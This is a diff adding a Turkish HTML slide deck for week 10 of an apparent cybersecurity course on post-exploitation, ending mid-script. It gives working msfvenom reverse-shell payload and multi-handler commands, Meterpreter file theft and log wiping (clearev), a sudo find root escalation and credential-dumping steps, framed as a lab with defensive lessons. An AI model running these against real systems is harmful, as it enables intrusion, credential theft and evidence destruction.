@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="tr" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siber Saldırı ve Savunma Yöntemleri - Hafta 10 Sunumu | ezfesoft 26-27 Güz</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-card: rgba(30, 41, 59, 0.75);
+            --bg-card-border: rgba(255, 255, 255, 0.12);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-color: #f43f5e;
+            --accent-glow: #f43f5e40;
+            --code-bg: #090d16;
+            --nav-bg: rgba(15, 23, 42, 0.85);
+            --radius: 16px;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f1f5f9;
+            --bg-card: rgba(255, 255, 255, 0.92);
+            --bg-card-border: rgba(0, 0, 0, 0.08);
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --code-bg: #1e293b;
+            --nav-bg: rgba(241, 245, 249, 0.85);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            user-select: none;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        /* Header / Top Progress */
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--bg-card-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .progress-container {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.05);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-color), #38bdf8);
+            width: 0%;
+            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .course-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            color: var(--text-primary);
+            text-decoration: none;
+        }
+
+        .badge-pill {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            border: 1px solid var(--accent-color);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-icon {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            color: var(--text-primary);
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1.1rem;
+        }
+
+        .btn-icon:hover {
+            background: var(--accent-color);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        /* Slide Viewport */
+        .slide-container {
+            flex: 1;
+            margin-top: 60px;
+            margin-bottom: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            position: relative;
+        }
+
+        .slide-card {
+            width: 100%;
+            max-width: 1100px;
+            min-height: 520px;
+            max-height: calc(100vh - 160px);
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--bg-card-border);
+            border-radius: var(--radius);
+            padding: 40px 48px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            overflow-y: auto;
+            position: relative;
+            animation: slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(12px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .slide-header {
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--bg-card-border);
+            padding-bottom: 16px;
+        }
+
+        .slide-meta {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .slide-title {
+            font-size: 2.1rem;
+            font-weight: 800;
+            line-height: 1.25;
+            background: linear-gradient(135deg, var(--text-primary) 40%, var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .slide-subtitle {
+            font-size: 1.15rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+            margin-top: 6px;
+        }
+
+        .slide-body {
+            flex: 1;
+            font-size: 1.1rem;
+            line-height: 1.7;
+            color: var(--text-primary);
+        }
+
+        /* Content Formatting */
+        .content-paragraph {
+            margin-bottom: 14px;
+            white-space: pre-line;
+        }
+
+        .content-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 16px 0;
+        }
+
+        .content-list-item {
+            background: rgba(255,255,255,0.03);
+            border-left: 4px solid var(--accent-color);
+            padding: 12px 18px;
+            border-radius: 0 10px 10px 0;
+            font-size: 1.05rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .content-list-item::before {
+            content: "✦";
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+
+        .step-badge {
+            background: var(--accent-color);
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 12px;
+            padding: 16px 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.95rem;
+            color: #38bdf8;
+            overflow-x: auto;
+            margin: 16px 0;
+            white-space: pre-wrap;
+            user-select: text;
+        }
+
+        .visual-box {
+            margin-top: 20px;
+            background: rgba(0,0,0,0.2);
+            border: 1px dashed var(--accent-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        /* Bottom Nav Controller */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-top: 1px solid var(--bg-card-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .nav-center {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-nav {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            border: 1px solid var(--accent-color);
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-nav:hover:not(:disabled) {
+            background: var(--accent-color);
+            color: #fff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px var(--accent-glow);
+        }
+
+        .btn-nav:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            border-color: transparent;
+        }
+
+        .slide-counter {
+            font-weight: 700;
+            font-size: 1.05rem;
+            min-width: 90px;
+            text-align: center;
+            background: var(--bg-card);
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid var(--bg-card-border);
+        }
+
+        /* Overview Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            z-index: 200;
+            display: none;
+            padding: 40px;
+            overflow-y: auto;
+        }
+
+        .modal-overlay.active {
+            display: block;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .grid-overview {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 16px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .thumb-card {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .thumb-card:hover, .thumb-card.active {
+            border-color: var(--accent-color);
+            transform: scale(1.03);
+            box-shadow: 0 6px 20px var(--accent-glow);
+        }
+
+        .thumb-num {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+
+        .thumb-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            line-height: 1.3;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        @media (max-width: 768px) {
+            .slide-card {
+                padding: 24px;
+                min-height: 440px;
+            }
+            .slide-title {
+                font-size: 1.5rem;
+            }
+            .bottom-nav {
+                padding: 0 12px;
+            }
+            .btn-nav span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation Bar -->
+    <header class="top-bar">
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <a href="../../README.md" class="course-badge">
+            <span>🛡️</span>
+            <span>Siber Saldırı ve Savunma Yöntemleri</span>
+            <span class="badge-pill">Hafta 10</span>
+        </a>
+        <div class="header-actions">
+            <button class="btn-icon" id="themeToggle" title="Temayı Değiştir (T)">☀️</button>
+            <button class="btn-icon" id="overviewToggle" title="Slayt Haritası (M / O)">📑</button>
+            <button class="btn-icon" id="fullscreenToggle" title="Tam Ekran (F)">⛶</button>
+        </div>
+    </header>
+
+    <!-- Main Presentation Slide Area -->
+    <main class="slide-container">
+        <div class="slide-card" id="slideCard">
+            <div class="slide-header">
+                <div class="slide-meta" id="slideMeta">SLAYT 1 / 32 • Siber Güvenlik & SOC</div>
+                <h1 class="slide-title" id="slideTitle">Yükleniyor...</h1>
+                <h2 class="slide-subtitle" id="slideSubtitle"></h2>
+            </div>
+            <div class="slide-body" id="slideBody">
+                <!-- Slide content injected by JS -->
+            </div>
+        </div>
+    </main>
+
+    <!-- Bottom Navigation Dock -->
+    <footer class="bottom-nav">
+        <div style="display: flex; gap: 8px;">
+            <a href="hafta-09.html" class="btn-nav" style="text-decoration:none;" >
+                <span>◀ Önceki Hafta</span>
+            </a>
+            <a href="../index.html" class="btn-nav" style="text-decoration:none;">
+                <span>📚 Ders Kataloğu</span>
+            </a>
+        </div>
+
+        <div class="nav-center">
+            <button class="btn-nav" id="prevBtn">
+                <span>◀</span> <span>Önceki</span>
+            </button>
+            <div class="slide-counter" id="slideCounter">1 / 32</div>
+            <button class="btn-nav" id="nextBtn">
+                <span>Sonraki</span> <span>▶</span>
+            </button>
+        </div>
+
+        <div style="display: flex; gap: 8px;">
+            <a href="hafta-11.html" class="btn-nav" style="text-decoration:none;" >
+                <span>Sonraki Hafta ▶</span>
+            </a>
+        </div>
+    </footer>
+
+    <!-- Overview Modal Grid -->
+    <div class="modal-overlay" id="overviewModal">
+        <div class="modal-header">
+            <h2>Slayt Haritası (32 Slayt)</h2>
+            <button class="btn-icon" id="closeModal">✕</button>
+        </div>
+        <div class="grid-overview" id="gridOverview"></div>
+    </div>
+
+    <script>
+        const slides = [{"baslik": "Siber Güvenlik: Hafta 10", "altbaslik": "İleri Sızma Testi ve Sömürü Sonrası (Post-Exploitation)", "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: İleri Düzey Sömürü ve Sistem Hakimiyeti\nHaftalık Odak: msfvenom ile Payload Üretimi, Multi-Handler, Meterpreter ve İz Silme\nHedef: Ters bağlantı ajanları üretmek, oturum yönetmek ve sömürü sonrası adımları icra etmek.", "gorsel": {"type": "image", "query": "post exploitation meterpreter privilege escalation reverse shell"}}, {"baslik": "Neden Bu Konuyu Öğreniyoruz?", "altbaslik": "Sektörel Bağlam: İçeri Girdikten Sonra Ne Olur?", "icerik": "Sisteme sızmak sadece kapıyı aralamaktır; asıl risk sömürü sonrası aşamada başlar.\n- Saldırgan sistemde kalıcılık (Persistence) sağlar ve yetkilerini yükseltir.\n- Ağdaki diğer sunuculara sıçrar (Pivoting) ve izlerini siler.\nSavunma tarafı bu hareketleri tespit edip durdurmayı bilmelidir.", "gorsel": {"type": "image", "query": "threat hunting soc analyst detecting lateral movement"}}, {"baslik": "Haftanın Öğrenme Kazanımları", "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?", "icerik": "1. Sömürü Sonrası (Post-Exploitation) aşamalarını açıklar.\n2. Meterpreter payload'unun bellek içi (In-Memory) çalışma mimarisini kavrar.\n3. msfvenom aracıyla özel Linux/ELF ve Windows payloadları üretir.\n4. Metasploit Multi-Handler dinleyicisi ile ters bağlantıları (Reverse TCP) yakalar.\n5. Meterpreter komutları ile bilgi toplama, dosya çekme ve iz silme (clearev) uygular.", "gorsel": {"type": "image", "query": "learning objectives post exploitation checklist"}}, {"baslik": "Sömürü Sonrası (Post-Exploitation) Adımları", "altbaslik": "Sistem Hakimiyeti Yol Haritası", "icerik": "[İlk Erişim (Foothold)]\n       |\n       v\n[Sistem Keşfi (Discovery)] -> İşletim sistemi, kullanıcılar, ağ bağlantıları\n       |\n       v\n[Yetki Yükseltme (Privilege Escalation)] -> Düşük kullanıcıdan root/SYSTEM'e geçiş\n       |\n       v\n[Kalıcılık (Persistence)] -> Arka kapı yerleştirme\n       |\n       v\n[Yatay İlerleme (Pivoting)] -> Diğer iç sunuculara sıçrama\n       |\n       v\n[İz Silme (Covering Tracks)] -> Log temizleme", "gorsel": {"type": "image", "query": "post exploitation workflow diagram privilege escalation"}}, {"baslik": "Meterpreter Nedir ve Neden Çok Güçlüdür?", "altbaslik": "Gelişmiş Saldırı Ajanı", "icerik": "Meterpreter, Metasploit'in en yetenekli saldırı yüküdür.\nÜstün Özellikleri:\n- Bellek İçi (In-Memory) Çalışır: Sabit diske dosya yazmaz, doğrudan RAM'de meşru süreçlerin (explorer.exe vb.) içine enjekte olur.\n- Antivirüsleri Zorlar: Diskte imza bırakmadığı için geleneksel antivirüsleri atlatır.\n- Şifreli İletişim: Saldırgan ile kurban arasındaki tüm komutlar TLS ile şifrelenir.", "gorsel": {"type": "image", "query": "meterpreter in memory execution ram stealth injection"}}, {"baslik": "Ters Bağlantı (Reverse Shell) vs Düz Bağlantı (Bind Shell)", "altbaslik": "Neden Reverse TCP?", "icerik": "- Bind Shell: Kurban bilgisayarda bir port açılır ve saldırgan bağlanır. Ancak kurbanın önündeki Güvenlik Duvarı dışarıdan gelen bu bağlantıyı ENGELLER!\n- Reverse TCP Shell: Kurban bilgisayar dışarıdaki saldırgan IP'sine doğru bağlantı açar. Güvenlik duvarları dışarıya giden bağlantılara genellikle izin verdiği için engeli aşar!", "gorsel": {"type": "image", "query": "bind shell vs reverse shell firewall egress diagram"}}, {"baslik": "msfvenom: Özel Payload Üretim Fabrikası", "altbaslik": "Her Platforma Uygun Ajan", "icerik": "msfvenom, bağımsız çalışabilen çalıştırılabilir (.exe, .elf, .apk, .war, .php) payload üreten araçtır.\nSözdizimi:\nmsfvenom -p <payload_adı> LHOST=<Kali_IP> LPORT=<Port> -f <format> -o <dosya_adı>\nÖrnek:\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=5555 -f elf -o ajan.elf", "gorsel": {"type": "image", "query": "msfvenom payload generator terminal screen command line"}}, {"baslik": "Metasploit Multi-Handler Dinleyicisi", "altbaslik": "Gelen Bağlantıları Karşılamak", "icerik": "Kurban makinede çalışan ajan Kali'mize doğru ters bağlantı kurduğunda, bu bağlantıyı kabul edecek bir dinleyici gereklidir.\nModül: exploit/multi/handler\nAyarlar:\n- set payload linux/x86/meterpreter/reverse_tcp\n- set LHOST <Kali_IP>\n- set LPORT 5555\n- exploit (Dinlemeye başlar)", "gorsel": {"type": "image", "query": "metasploit multi handler listening reverse connection"}}, {"baslik": "Temel Meterpreter Komutları", "altbaslik": "Hedefte Hüküm Sürmek", "icerik": "- sysinfo : Hedef sistemin işletim sistemi ve mimarisini gösterir.\n- getuid : Hangi kullanıcı yetkisinde olduğunuzu gösterir.\n- ps : Çalışan tüm süreçleri listeler.\n- download /etc/passwd . : Hedef bilgisayardan dosya çeker.\n- upload malware.exe : Hedefe dosya yükler.\n- shell : Standart işletim sistemi kabuğuna düşer.\n- clearev : Windows/Linux olay günlüklerini (Event Logs) temizler.", "gorsel": {"type": "image", "query": "meterpreter commands cheat sheet terminal options"}}, {"baslik": "Yetki Yükseltme (Privilege Escalation) Mantığı", "altbaslik": "Kullanıcıdan Yöneticiliğe Geçiş", "icerik": "Sisteme sızıldığında genellikle düşük yetkili bir hesap (örn: www-data) elde edilir.\nYetki Yükseltme Yolları:\n- Çekirdek Açıkları (Kernel Exploits - Dirty COW vb.)\n- Yanlış Yapılandırılmış SUID Dosyaları\n- Parolası unutulmuş Sudo Hakları (sudo -l)\n- Zafiyetli Servis İzinleri.", "gorsel": {"type": "image", "query": "privilege escalation ladder user to root admin icon"}}, {"baslik": "Uygulama Laboratuvarı: Payload ve Meterpreter", "altbaslik": "Laboratuvar Hedeflerimiz", "icerik": "Laboratuvarımızda:\n1. msfvenom ile Linux için Meterpreter ajanı üreteceğiz.\n2. Metasploit Multi-Handler dinleyicisini kuracağız.\n3. Ajanı koşturup canlı Meterpreter oturumu yakalayacağız.\n4. sysinfo, getuid ve dosya çekme komutlarını uygulayacağız.", "gorsel": {"type": "image", "query": "students cybersecurity lab terminal meterpreter practice"}}, {"baslik": "Uygulama 1: msfvenom ile Ajan Üretme", "altbaslik": "ELF Payload Derleme", "icerik": "Masaüstünde postlab klasörü açalım:\nmkdir -p ~/Desktop/postlab && cd ~/Desktop/postlab\nKali IP adresinizi kontrol edin (ip a) ve komutu yazın:\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=5555 -f elf -o lab_ajani.elf\nBeklenen Çıktı: Saved as: lab_ajani.elf", "gorsel": {"type": "image", "query": "msfvenom generation terminal output elf payload"}}, {"baslik": "Uygulama 2: Multi-Handler Başlatma", "altbaslik": "Dinleyiciyi Hazırlama", "icerik": "Yeni bir terminalde msfconsole'u açın:\nmsfconsole -q\nŞu komutları sırayla yazın:\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 192.168.1.105\nmsf6 exploit(multi/handler) > set LPORT 5555\nmsf6 exploit(multi/handler) > exploit\n[*] Started reverse TCP handler on 192.168.1.105:5555...", "gorsel": {"type": "image", "query": "multi handler listening reverse tcp terminal"}}, {"baslik": "Uygulama 3: Ajanı Koşturma ve Oturum Açma", "altbaslik": "Ters Bağlantıyı Yakalamak", "icerik": "İlk terminalde ajana çalıştırma izni verip arka planda çalıştırın:\nchmod +x ~/Desktop/postlab/lab_ajani.elf\n~/Desktop/postlab/lab_ajani.elf &\nMetasploit Ekranında Çıkan Müjde:\n[+] Meterpreter session 1 opened (192.168.1.105:5555 -> 192.168.1.105:xxxxx)\nmeterpreter >", "gorsel": {"type": "image", "query": "meterpreter session 1 opened prompt terminal"}}, {"baslik": "Uygulama 4: Meterpreter Oturumunda Keşif", "altbaslik": "Sistem Bilgilerini Toplama", "icerik": "meterpreter > istemcisinde şu komutları deneyin:\nsysinfo\n(Sistem adı, işletim sistemi ve mimari gelir)\ngetuid\n(Geçerli kullanıcı kimliği ekrana basılır)\nps\n(Çalışan tüm süreçleri listeleyin)", "gorsel": {"type": "image", "query": "meterpreter sysinfo getuid output terminal"}}, {"baslik": "Uygulama 5: Dosya İndirme ve İz Silme", "altbaslik": "download ve clearev", "icerik": "Hedef sistemden /etc/passwd dosyasını Kali'mize çekelim:\nmeterpreter > download /etc/passwd .\nOlay günlüklerini temizleyelim:\nmeterpreter > clearev\n[*] Wiping 3 records from Application...\n[*] Event logs cleared!", "gorsel": {"type": "image", "query": "meterpreter download file clearev event log wipe"}}, {"baslik": "Sık Yapılan Hatalar ve İpuçları", "altbaslik": "Post-Exploitation Sorunları", "icerik": "1. LHOST Hatası: LHOST kısmına kurbanın değil, KENDİ Kali IP adresinizin yazıldığından emin olun.\n2. Port Çakışması: 'Handler failed to bind' hatası alırsanız port meşguldür, LPORT'u 6666 yapın.\n3. Oturum Askıda Kalırsa: sessions -l ile oturumları listeleyin, sessions -i 1 ile oturuma tekrar girin.", "gorsel": {"type": "image", "query": "troubleshooting meterpreter sessions checklist warning"}}, {"baslik": "Sektörel Vaka: SolarWinds Siber Casusluğu", "altbaslik": "Tedarik Zinciri ve Gizli Kalma", "icerik": "Vaka: Rus APT grubu SolarWinds şirketinin yazılım güncelleme sunucusuna sızarak resmi güncellemelerin içine gizli bir ajan (Sunburst) yerleştirdi.\nPost-Exploitation Analizi: Zararlı aylarca hiçbir şey yapmadan bekledi, antivirüsleri devre dışı bıraktı ve sadece RAM'de çalışarak ABD devlet kurumlarının verilerini sızdırdı.\nDers: Bellek içi çalışan gelişmiş ajanlar disk antivirüslerini tamamen atlatabilir.", "gorsel": {"type": "image", "query": "solarwinds cyber espionage supply chain hack breach"}}, {"baslik": "Vaka Analizi: Tehdit Avcılığı (Threat Hunting)", "altbaslik": "Çıkarılan Mühendislik Dersi", "icerik": "Savunma Çözümü: EDR (Endpoint Detection and Response) ve Tehdit Avcılığı.\n- Yalnızca diski taramak yetmez; bellek (RAM) süreç enjeksiyonları, şüpheli ağ bağlantıları ve giden ters bağlantılar (Egress) sürekli denetlenmelidir.", "gorsel": {"type": "image", "query": "threat hunting edr endpoint security ram analysis"}}, {"baslik": "Mini Quiz: Soru 1", "altbaslik": "Payload Türleri", "icerik": "Soru: Kurban bilgisayarın doğrudan saldırganın IP ve portuna doğru bağlantı açtığı kabuk türüne ne ad verilir?\nA) Bind Shell\nB) Reverse Shell (Ters Bağlantı)\nC) Web Shell\nD) Telnet Shell\n\nDoğru Cevap: B (Reverse Shell)", "gorsel": {"type": "image", "query": "quiz question multiple choice exam board"}}, {"baslik": "Mini Quiz: Soru 2", "altbaslik": "Araç Tanıma", "icerik": "Soru: Metasploit çerçevesinde bağımsız çalışabilen özel trojan ve payload dosyaları (.elf, .exe) üreten araç hangisidir?\nA) msfconsole\nB) msfvenom\nC) Nmap\nD) Wireshark\n\nDoğru Cevap: B (msfvenom)", "gorsel": {"type": "image", "query": "msfvenom tool question test"}}, {"baslik": "Mini Quiz: Soru 3", "altbaslik": "Meterpreter Mimarisi", "icerik": "Soru: Meterpreter'ın geleneksel disk antivirüslerine yakalanmamasının en temel sebebi nedir?\nA) Şifresiz olması\nB) Diske yazmadan doğrudan RAM bellekte çalışması (In-Memory)\nC) Çok yavaş çalışması\nD) Linux desteklememesi\n\nDoğru Cevap: B (Doğrudan RAM bellekte çalışması)", "gorsel": {"type": "image", "query": "meterpreter memory architecture question"}}, {"baslik": "Mini Quiz: Soru 4", "altbaslik": "Meterpreter Komutları", "icerik": "Soru: Ele geçirilen hedef sistemdeki olay günlüklerini (Event Logs) temizleyerek izleri silen Meterpreter komutu hangisidir?\nA) delete_all\nB) clearev\nC) clear_history\nD) wipe_disk\n\nDoğru Cevap: B (clearev)", "gorsel": {"type": "image", "query": "clearev command question test"}}, {"baslik": "Mini Quiz: Soru 5", "altbaslik": "Sömürü Sonrası", "icerik": "Soru: Ele geçirilen düşük yetkili bir kullanıcı hesabından root veya Administrator yetkisine geçiş işlemine ne ad verilir?\nA) Pivoting\nB) Privilege Escalation (Yetki Yükseltme)\nC) Phishing\nD) Fuzzing\n\nDoğru Cevap: B (Yetki Yükseltme)", "gorsel": {"type": "image", "query": "privilege escalation question board"}}, {"baslik": "Sınıf İçi Tartışma ve Uygulama", "altbaslik": "Meterpreter ile Süreç Taşıma", "icerik": "Uygulama Görevi:\nMeterpreter oturumunda migrate komutunu kullanarak ajanınızı başka bir süreç numarasına (PID) taşımayı deneyin.\n- ps komutu ile hedef PID'yi bulun.\n- migrate <PID> komutunu başarıyla çalıştıran ilk öğrenci el kaldırsın!", "gorsel": {"type": "image", "query": "students competition classroom coding linux challenge"}}, {"baslik": "Yetki Yükseltme: Sudo Haklarını Sömürme", "altbaslik": "sudo -l Kontrolü", "icerik": "Ele geçirilen kullanıcıda ilk bakılan komut: sudo -l\nBu komut kullanıcının şifresiz çalıştırabildiği ayrıcalıklı programları gösterir.\nÖrnek:\nKullanıcı 'sudo find' çalıştırabiliyorsa:\nsudo find . -exec /bin/sh \\; -quit\nkomutuyla tek saniyede ROOT yetkisine yükselir! (GTFOBins tekniği).", "gorsel": {"type": "image", "query": "gtfobins sudo privilege escalation terminal root"}}, {"baslik": "SAM ve Shadow Dosyalarından Hash Çalma", "altbaslik": "Credential Dumping Mantığı", "icerik": "Yetkili erişim kazanıldıktan sonra amaç diğer kullanıcıların parolalarını almaktır.\n- Windows: mimikatz veya Meterpreter hashdump ile RAM'deki NTLM hashleri çekilir.\n- Linux: /etc/shadow dosyasındaki SHA-512 hashleri okunup John the Ripper'a aktarılır.", "gorsel": {"type": "image", "query": "credential dumping sam shadow password hashes"}}, {"baslik": "Ağda Yatay İlerleme (Lateral Movement & Pivoting)", "altbaslik": "İç Ağdaki Diğer Sunuculara Atlama", "icerik": "Pivoting:\nEle geçirilen ilk sunucu (DMZ Web Sunucusu) bir sıçrama tahtası (Proxy/Router) olarak kullanılır.\n- Metasploit autoroute ve socks_proxy modülü ile saldırgan kendi Kali'sini sanki iç ağdaymış gibi yönlendirir ve internete kapalı olan iç veritabanı sunucularını taramaya başlar!", "gorsel": {"type": "image", "query": "pivoting lateral movement network jump diagram"}}, {"baslik": "Çözümlü Uygulama: Meterpreter Oturum Yönetimi", "altbaslik": "sessions Komutları", "icerik": "Birden fazla kurban makine ele geçirildiğinde oturumlar şöyle yönetilir:\n- Arka Plana Atma: CTRL + Z veya background\n- Oturumları Listeleme: sessions -l\n- 2 Numaralı Oturuma Geçiş: sessions -i 2\n- Oturumu Kapatma: sessions -k 1", "gorsel": {"type": "image", "query": "metasploit sessions management terminal screen"}}, {"baslik": "Haftalık Konu Özeti", "altbaslik": "Bu Hafta Neler Öğrendik?", "icerik": "- Sömürü sonrası aşama sistem hakimiyeti ve yetki yükseltme sürecidir.\n- Reverse TCP bağlantıları güvenlik duvarlarını aşmak için standart tercihtir.\n- msfvenom her türlü platforma uygun ajan üretir, Multi-Handler bu bağlantıyı karşılar.\n- Meterpreter bellek içi çalışarak tam sistem kontrolü ve iz silme imkanı sağlar.", "gorsel": {"type": "image", "query": "summary concept mind map review"}}, {"baslik": "Gelecek Haftaya Bakış", "altbaslik": "Hafta 11: Web Uygulama Güvenliği ve SQL Injection", "icerik": "Ön Hazırlık:\n- Web uygulamaları ve OWASP Top 10 sıralaması nedir?\n- SQL Injection açığı nasıl ortaya çıkar ve ' OR '1'='1 nasıl çalışır?\n- SQLMap aracıyla tüm veritabanı tabloları nasıl sızdırılır?", "gorsel": {"type": "image", "query": "sql injection web application security database concept"}}, {"baslik": "Çıkış Bileti (Exit Ticket)", "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız", "icerik": "Günün Sorusu:\n'Neden sızma testlerinde hedef makinede bir port açıp bağlanmak (Bind Shell) yerine hedef makinenin bizim Kali IP'mize bağlanması (Reverse Shell) tercih edilir?'\n\nCevabınızı kâğıda yazıp teslim ediniz.", "gorsel": {"type": "image", "query": "exit ticket paper feedback classroom student"}}];
+        let currentIndex = 0;
+
+        const slideTitle = document.getElementById('slideTitle');
+        const slideSubtitle = document.getElementById('slideSubtitle');
+        const slideBody = document.getElementById('slideBody');
+        const slideMeta = document.getElementById('slideMeta');
+        const slideCounter = document.getElementById('slideCounter');
+        const progressBar = document.getElementById('progressBar');
+
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const slideCard = document.getElementById('slideCard');
+
+        const themeToggle = document.getElementById('themeToggle');
+        const overviewToggle = document.getElementById('overviewToggle');
+        const overviewModal = document.getElementById('overviewModal');
+        const closeModal = document.getElementById('closeModal');
+        const gridOverview = document.getElementById('gridOverview');
+        const fullscreenToggle = document.getElementById('fullscreenToggle');
+
+        function formatContent(text) {
+            if (!text) return '';
+            const lines = text.split('\n');
+            let html = '';
+            let inList = false;
+
+            lines.forEach((line) => {
+                const trimmed = line.trim();
+                if (!trimmed) return;
+
+                if (trimmed.startsWith('- ') || trimmed.startsWith('* ')) {
+                    if (!inList) {
+                        html += '<ul class="content-list">';
+                        inList = true;
+                    }
+                    html += `<li class="content-list-item">${trimmed.substring(2)}</li>`;
+                }
+                else if (/^\d+\.\s/.test(trimmed)) {
+                    if (inList) {
+                        html += '</ul>';
+                        inList = false;
+                    }
+                    const match = trimmed.match(/^(\d+)\.\s+(.*)/);
+                    if (match) {
+                        html += `<div class="content-list-item"><span class="step-badge">${match[1]}</span><span>${match[2]}</span></div>`;
+                    }
+                }
+                else if (trimmed.includes(';') || trimmed.includes('{') || trimmed.includes('}') || trimmed.includes('print(') || trimmed.includes('def ')) {
+                    if (inList) { html += '</ul>'; inList = false; }
+                    html += `<div class="code-block">${trimmed}</div>`;
+                }
+                else {
+                    if (inList) { html += '</ul>'; inList = false; }
+                    html += `<div class="content-paragraph">${trimmed}</div>`;
